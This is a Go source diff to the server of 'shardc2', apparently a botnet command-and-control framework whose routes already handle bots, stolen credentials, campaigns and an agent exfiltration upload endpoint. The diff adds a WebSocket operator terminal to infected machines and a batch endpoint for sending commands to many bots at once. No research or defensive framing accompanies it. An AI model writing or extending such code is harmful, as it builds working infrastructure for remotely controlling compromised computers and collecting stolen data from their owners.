@@ -17,6 +17,7 @@ import (
 	"github.com/gofiber/fiber/v2/middleware/limiter"
 	"github.com/gofiber/fiber/v2/middleware/logger"
 	"github.com/gofiber/fiber/v2/middleware/recover"
+	"github.com/gofiber/websocket/v2"
 	"github.com/shardc2/shardc2/internal/database"
 	"github.com/shardc2/shardc2/internal/server/engine"
 	"github.com/shardc2/shardc2/internal/server/handlers"
@@ -71,8 +72,10 @@ func (s *Server) setupRoutes() {
 		return c.JSON(fiber.Map{"status": "ok", "service": "shardc2"})
 	})
 
+	wsHub := handlers.NewWSHub()
+
 	botHandler := handlers.NewBotHandler(s.db)
-	cmdHandler := handlers.NewCommandHandler(s.db)
+	cmdHandler := handlers.NewCommandHandler(s.db, wsHub)
 	credHandler := handlers.NewCredentialHandler(s.db)
 	campHandler := handlers.NewCampaignHandler(s.db)
 	exfilHandler := handlers.NewExfilHandler(s.db)
@@ -99,6 +102,16 @@ func (s *Server) setupRoutes() {
 	agent.Post("/exfil", payloadMW, agentMW, agentLimiter, exfilHandler.Upload)
 	agent.Post("/refresh-token", payloadMW, agentMW, botHandler.RefreshToken)
 
+	// WebSocket route (auth via query param)
+	api.Use("/ws", handlers.WSUpgradeCheck())
+	api.Get("/ws/terminal", func(c *fiber.Ctx) error {
+		token := c.Query("token")
+		if token == "" || token != s.config.OperatorToken {
+			return c.Status(401).JSON(fiber.Map{"error": "unauthorized"})
+		}
+		return c.Next()
+	}, websocket.New(handlers.WSHandler(wsHub)))
+
 	// Operator routes
 	op := api.Group("", middleware.OperatorAuth(s.config.OperatorToken))
 	op.Use(limiter.New(limiter.Config{Max: 120, Expiration: time.Minute}))
@@ -110,6 +123,7 @@ func (s *Server) setupRoutes() {
 
 	cmds := op.Group("/commands")
 	cmds.Post("/", cmdHandler.Create)
+	cmds.Post("/batch", cmdHandler.BatchCreate)
 	cmds.Get("/history/:bot_id", cmdHandler.History)
 
 	creds := op.Group("/credentials")
